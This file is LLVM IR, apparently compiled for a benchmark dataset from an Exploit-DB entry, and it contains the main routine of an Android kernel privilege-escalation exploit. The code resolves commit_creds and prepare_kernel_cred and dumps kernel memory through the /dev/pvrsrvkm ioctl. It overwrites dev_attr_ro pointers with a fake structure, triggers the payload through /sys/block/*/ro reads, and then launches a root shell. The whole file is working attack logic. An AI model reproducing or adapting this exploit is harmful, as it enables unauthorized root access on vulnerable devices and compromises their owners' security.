; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/android/remote/extr_38310.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/android/remote/extr_38310.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dirent = type { i8* }

@.str = private unnamed_addr constant [28 x i8] c"[+] looking for symbols...\0A\00", align 1
@.str.1 = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [46 x i8] c"[-] commit_creds symbol not found, aborting!\0A\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [53 x i8] c"[-] prepare_kernel_cred symbol not found, aborting!\0A\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"dev_attr_ro\00", align 1
@.str.6 = private unnamed_addr constant [45 x i8] c"[-] dev_attr_ro symbol not found, aborting!\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"[+] opening prvsrvkm device...\0A\00", align 1
@.str.8 = private unnamed_addr constant [14 x i8] c"/dev/pvrsrvkm\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [47 x i8] c"[-] failed opening pvrsrvkm device, aborting!\0A\00", align 1
@.str.10 = private unnamed_addr constant [30 x i8] c"[+] dumping kernel memory...\0A\00", align 1
@DUMP_SIZE = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [36 x i8] c"[-] failed during ioctl, aborting!\0A\00", align 1
@.str.12 = private unnamed_addr constant [48 x i8] c"[+] searching kmem for dev_attr_ro pointers...\0A\00", align 1
@fake_dev_attr_ro = common dso_local global i32 0, align 4
@.str.13 = private unnamed_addr constant [61 x i8] c"[+] poisoned %d dev_attr_ro pointers with fake_dev_attr_ro!\0A\00", align 1
@.str.14 = private unnamed_addr constant [52 x i8] c"[-] could not find any dev_attr_ro ptrs, aborting!\0A\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"[+] clobbering kmem with poisoned pointers...\0A\00", align 1
@.str.16 = private unnamed_addr constant [56 x i8] c"[+] triggering privesc via block ro sysfs attribute...\0A\00", align 1
@.str.17 = private unnamed_addr constant [11 x i8] c"/sys/block\00", align 1
@.str.18 = private unnamed_addr constant [42 x i8] c"[-] failed opening /sys/block, aborting!\0A\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c".\00", align 1
@.str.20 = private unnamed_addr constant [3 x i8] c"..\00", align 1
@.str.21 = private unnamed_addr constant [17 x i8] c"/sys/block/%s/ro\00", align 1
@O_RDONLY = common dso_local global i32 0, align 4
@.str.22 = private unnamed_addr constant [50 x i8] c"[-] failed opening ro sysfs attribute, aborting!\0A\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"0wned\0A\00", align 1
@.str.24 = private unnamed_addr constant [50 x i8] c"[-] could not trigger privesc payload, aborting!\0A\00", align 1
@.str.25 = private unnamed_addr constant [48 x i8] c"[+] restoring original dev_attr_ro pointers...\0A\00", align 1
@.str.26 = private unnamed_addr constant [39 x i8] c"[+] restored %d dev_attr_ro pointers!\0A\00", align 1
@.str.27 = private unnamed_addr constant [47 x i8] c"[-] could not restore any pointers, aborting!\0A\00", align 1
@.str.28 = private unnamed_addr constant [47 x i8] c"[-] privileges not escalated, exploit failed!\0A\00", align 1
@.str.29 = private unnamed_addr constant [45 x i8] c"[+] privileges escalated, enjoy your shell!\0A\00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"/system/bin/sh\00", align 1
@.str.31 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca %struct.dirent*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca [8 x i8], align 1
  %15 = alloca [256 x i8], align 16
  %16 = alloca i64, align 8
  %17 = alloca i64*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %19 = call i64 @get_symbol(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i64 %19, i64* @commit_creds, align 8
  %20 = load i64, i64* @commit_creds, align 8
  %21 = icmp ne i64 %20, 0
  br i1 %21, label %25, label %22

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.2, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %2
  %26 = call i64 @get_symbol(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  store i64 %26, i64* @prepare_kernel_cred, align 8
  %27 = load i64, i64* @prepare_kernel_cred, align 8
  %28 = icmp ne i64 %27, 0
  br i1 %28, label %32, label %29

29:                                               ; preds = %25
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.4, i64 0, i64 0))
  %31 = call i32 @exit(i32 1) #3
  unreachable

32:                                               ; preds = %25
  %33 = call i64 @get_symbol(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0))
  store i64 %33, i64* %16, align 8
  %34 = load i64, i64* %16, align 8
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %39, label %36

36:                                               ; preds = %32
  %37 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.6, i64 0, i64 0))
  %38 = call i32 @exit(i32 1) #3
  unreachable

39:                                               ; preds = %32
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %41 = load i32, i32* @O_RDWR, align 4
  %42 = call i32 @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.8, i64 0, i64 0), i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %48

45:                                               ; preds = %39
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.9, i64 0, i64 0))
  %47 = call i32 @exit(i32 1) #3
  unreachable

48:                                               ; preds = %39
  %49 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.10, i64 0, i64 0))
  %50 = load i32, i32* @DUMP_SIZE, align 4
  %51 = add nsw i32 %50, 4096
  %52 = call i8* @malloc(i32 %51)
  store i8* %52, i8** %12, align 8
  %53 = load i8*, i8** %12, align 8
  %54 = load i32, i32* @DUMP_SIZE, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds i8, i8* %53, i64 %55
  %57 = getelementptr inbounds i8, i8* %56, i64 4096
  store i8* %57, i8** %13, align 8
  %58 = load i8*, i8** %12, align 8
  %59 = load i32, i32* @DUMP_SIZE, align 4
  %60 = add nsw i32 %59, 4096
  %61 = call i32 @memset(i8* %58, i32 0, i32 %60)
  %62 = load i32, i32* %8, align 4
  %63 = load i8*, i8** %12, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 4096
  %65 = load i32, i32* @DUMP_SIZE, align 4
  %66 = sub nsw i32 %65, 4096
  %67 = call i32 @do_ioctl(i32 %62, i8* null, i32 0, i8* %64, i32 %66)
  store i32 %67, i32* %9, align 4
  %68 = load i32, i32* %9, align 4
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %73

70:                                               ; preds = %48
  %71 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %72 = call i32 @exit(i32 1) #3
  unreachable

73:                                               ; preds = %48
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %10, align 4
  %75 = load i8*, i8** %12, align 8
  %76 = bitcast i8* %75 to i64*
  store i64* %76, i64** %17, align 8
  br label %77

77:                                               ; preds = %92, %73
  %78 = load i64*, i64** %17, align 8
  %79 = load i8*, i8** %13, align 8
  %80 = bitcast i8* %79 to i64*
  %81 = icmp ult i64* %78, %80
  br i1 %81, label %82, label %95

82:                                               ; preds = %77
  %83 = load i64*, i64** %17, align 8
  %84 = load i64, i64* %83, align 8
  %85 = load i64, i64* %16, align 8
  %86 = icmp eq i64 %84, %85
  br i1 %86, label %87, label %91

87:                                               ; preds = %82
  %88 = load i64*, i64** %17, align 8
  store i64 ptrtoint (i32* @fake_dev_attr_ro to i64), i64* %88, align 8
  %89 = load i32, i32* %10, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %10, align 4
  br label %91

91:                                               ; preds = %87, %82
  br label %92

92:                                               ; preds = %91
  %93 = load i64*, i64** %17, align 8
  %94 = getelementptr inbounds i64, i64* %93, i32 1
  store i64* %94, i64** %17, align 8
  br label %77

95:                                               ; preds = %77
  %96 = load i32, i32* %10, align 4
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.13, i64 0, i64 0), i32 %96)
  %98 = load i32, i32* %10, align 4
  %99 = icmp eq i32 %98, 0
  br i1 %99, label %100, label %103

100:                                              ; preds = %95
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.14, i64 0, i64 0))
  %102 = call i32 @exit(i32 1) #3
  unreachable

103:                                              ; preds = %95
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i64 0, i64 0))
  %105 = load i32, i32* %8, align 4
  %106 = load i8*, i8** %12, align 8
  %107 = load i32, i32* @DUMP_SIZE, align 4
  %108 = call i32 @do_ioctl(i32 %105, i8* %106, i32 %107, i8* null, i32 0)
  store i32 %108, i32* %9, align 4
  %109 = load i32, i32* %9, align 4
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %103
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %113 = call i32 @exit(i32 1) #3
  unreachable

114:                                              ; preds = %103
  %115 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.16, i64 0, i64 0))
  %116 = call i32* @opendir(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.17, i64 0, i64 0))
  store i32* %116, i32** %6, align 8
  %117 = load i32*, i32** %6, align 8
  %118 = icmp ne i32* %117, null
  br i1 %118, label %122, label %119

119:                                              ; preds = %114
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.18, i64 0, i64 0))
  %121 = call i32 @exit(i32 1) #3
  unreachable

122:                                              ; preds = %114
  store i32 0, i32* %10, align 4
  br label %123

123:                                              ; preds = %166, %139, %122
  %124 = load i32*, i32** %6, align 8
  %125 = call %struct.dirent* @readdir(i32* %124)
  store %struct.dirent* %125, %struct.dirent** %7, align 8
  %126 = icmp ne %struct.dirent* %125, null
  br i1 %126, label %127, label %167

127:                                              ; preds = %123
  %128 = load %struct.dirent*, %struct.dirent** %7, align 8
  %129 = getelementptr inbounds %struct.dirent, %struct.dirent* %128, i32 0, i32 0
  %130 = load i8*, i8** %129, align 8
  %131 = call i64 @strcmp(i8* %130, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i64 0, i64 0))
  %132 = icmp eq i64 %131, 0
  br i1 %132, label %139, label %133

133:                                              ; preds = %127
  %134 = load %struct.dirent*, %struct.dirent** %7, align 8
  %135 = getelementptr inbounds %struct.dirent, %struct.dirent* %134, i32 0, i32 0
  %136 = load i8*, i8** %135, align 8
  %137 = call i64 @strcmp(i8* %136, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.20, i64 0, i64 0))
  %138 = icmp eq i64 %137, 0
  br i1 %138, label %139, label %140

139:                                              ; preds = %133, %127
  br label %123

140:                                              ; preds = %133
  %141 = getelementptr inbounds [256 x i8], [256 x i8]* %15, i64 0, i64 0
  %142 = load %struct.dirent*, %struct.dirent** %7, align 8
  %143 = getelementptr inbounds %struct.dirent, %struct.dirent* %142, i32 0, i32 0
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @snprintf(i8* %141, i32 256, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.21, i64 0, i64 0), i8* %144)
  %146 = getelementptr inbounds [256 x i8], [256 x i8]* %15, i64 0, i64 0
  %147 = load i32, i32* @O_RDONLY, align 4
  %148 = call i32 @open(i8* %146, i32 %147)
  store i32 %148, i32* %11, align 4
  %149 = load i32, i32* %11, align 4
  %150 = icmp eq i32 %149, -1
  br i1 %150, label %151, label %154

151:                                              ; preds = %140
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.22, i64 0, i64 0))
  %153 = call i32 @exit(i32 1) #3
  unreachable

154:                                              ; preds = %140
  %155 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %156 = call i32 @memset(i8* %155, i32 0, i32 8)
  %157 = load i32, i32* %11, align 4
  %158 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %159 = call i32 @read(i32 %157, i8* %158, i32 8)
  store i32 %159, i32* %9, align 4
  %160 = load i32, i32* %11, align 4
  %161 = call i32 @close(i32 %160)
  %162 = getelementptr inbounds [8 x i8], [8 x i8]* %14, i64 0, i64 0
  %163 = call i64 @strcmp(i8* %162, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i64 0, i64 0))
  %164 = icmp eq i64 %163, 0
  br i1 %164, label %165, label %166

165:                                              ; preds = %154
  store i32 1, i32* %10, align 4
  br label %167

166:                                              ; preds = %154
  br label %123

167:                                              ; preds = %165, %123
  %168 = load i32, i32* %10, align 4
  %169 = icmp eq i32 %168, 0
  br i1 %169, label %170, label %173

170:                                              ; preds = %167
  %171 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.24, i64 0, i64 0))
  %172 = call i32 @exit(i32 1) #3
  unreachable

173:                                              ; preds = %167
  %174 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.25, i64 0, i64 0))
  %175 = load i32, i32* %8, align 4
  %176 = load i8*, i8** %12, align 8
  %177 = getelementptr inbounds i8, i8* %176, i64 4096
  %178 = load i32, i32* @DUMP_SIZE, align 4
  %179 = sub nsw i32 %178, 4096
  %180 = call i32 @do_ioctl(i32 %175, i8* null, i32 0, i8* %177, i32 %179)
  store i32 %180, i32* %9, align 4
  %181 = load i32, i32* %9, align 4
  %182 = icmp eq i32 %181, -1
  br i1 %182, label %183, label %186

183:                                              ; preds = %173
  %184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %185 = call i32 @exit(i32 1) #3
  unreachable

186:                                              ; preds = %173
  store i32 0, i32* %10, align 4
  %187 = load i8*, i8** %12, align 8
  %188 = bitcast i8* %187 to i64*
  store i64* %188, i64** %17, align 8
  br label %189

189:                                              ; preds = %204, %186
  %190 = load i64*, i64** %17, align 8
  %191 = load i8*, i8** %13, align 8
  %192 = bitcast i8* %191 to i64*
  %193 = icmp ult i64* %190, %192
  br i1 %193, label %194, label %207

194:                                              ; preds = %189
  %195 = load i64*, i64** %17, align 8
  %196 = load i64, i64* %195, align 8
  %197 = icmp eq i64 %196, ptrtoint (i32* @fake_dev_attr_ro to i64)
  br i1 %197, label %198, label %203

198:                                              ; preds = %194
  %199 = load i64, i64* %16, align 8
  %200 = load i64*, i64** %17, align 8
  store i64 %199, i64* %200, align 8
  %201 = load i32, i32* %10, align 4
  %202 = add nsw i32 %201, 1
  store i32 %202, i32* %10, align 4
  br label %203

203:                                              ; preds = %198, %194
  br label %204

204:                                              ; preds = %203
  %205 = load i64*, i64** %17, align 8
  %206 = getelementptr inbounds i64, i64* %205, i32 1
  store i64* %206, i64** %17, align 8
  br label %189

207:                                              ; preds = %189
  %208 = load i32, i32* %10, align 4
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.26, i64 0, i64 0), i32 %208)
  %210 = load i32, i32* %10, align 4
  %211 = icmp eq i32 %210, 0
  br i1 %211, label %212, label %215

212:                                              ; preds = %207
  %213 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.27, i64 0, i64 0))
  %214 = call i32 @exit(i32 1) #3
  unreachable

215:                                              ; preds = %207
  %216 = load i32, i32* %8, align 4
  %217 = load i8*, i8** %12, align 8
  %218 = load i32, i32* @DUMP_SIZE, align 4
  %219 = call i32 @do_ioctl(i32 %216, i8* %217, i32 %218, i8* null, i32 0)
  store i32 %219, i32* %9, align 4
  %220 = load i32, i32* %9, align 4
  %221 = icmp eq i32 %220, -1
  br i1 %221, label %222, label %225

222:                                              ; preds = %215
  %223 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.11, i64 0, i64 0))
  %224 = call i32 @exit(i32 1) #3
  unreachable

225:                                              ; preds = %215
  %226 = call i64 (...) @getuid()
  %227 = icmp ne i64 %226, 0
  br i1 %227, label %228, label %231

228:                                              ; preds = %225
  %229 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.28, i64 0, i64 0))
  %230 = call i32 @exit(i32 1) #3
  unreachable

231:                                              ; preds = %225
  %232 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.29, i64 0, i64 0))
  %233 = call i32 @execl(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.30, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i64 0, i64 0), i32* null)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @get_symbol(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @do_ioctl(i32, i8*, i32, i8*, i32) #1

declare dso_local i32* @opendir(i8*) #1

declare dso_local %struct.dirent* @readdir(i32*) #1

declare dso_local i64 @strcmp(i8*, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i64 @getuid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
